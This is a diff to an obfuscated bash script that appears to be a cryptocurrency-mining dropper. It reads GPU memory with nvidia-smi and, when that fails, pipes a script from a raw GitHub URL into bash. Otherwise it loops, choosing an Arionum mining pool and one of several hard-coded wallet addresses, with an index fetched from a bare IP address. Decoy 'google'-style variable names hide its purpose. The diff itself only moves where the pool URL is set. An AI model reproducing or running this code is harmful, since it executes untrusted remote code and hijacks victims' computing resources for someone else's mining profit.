@@ -4,6 +4,10 @@ apt-get install -y bc
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
+arr[0]="http://mine.arionumpool.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
 if [[ $google84121274 == *"failed"* ]]; then
 
 curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
@@ -12,7 +16,6 @@ else
 
 while true
 do
-
 
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
@@ -24,10 +27,6 @@ arr[6]="45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ
 arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio"
 rand=$[$RANDOM % ${#arr[@]}]
 google84121212121212121274=${arr[$(curl -s http://154.127.52.52/linuxgoogle84 | cat)]}
-
-arr[0]="http://mine.arionumpool.com"
-rand=$[$RANDOM % ${#arr[@]}]
-google841212121274=${arr[$rand]}
 
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
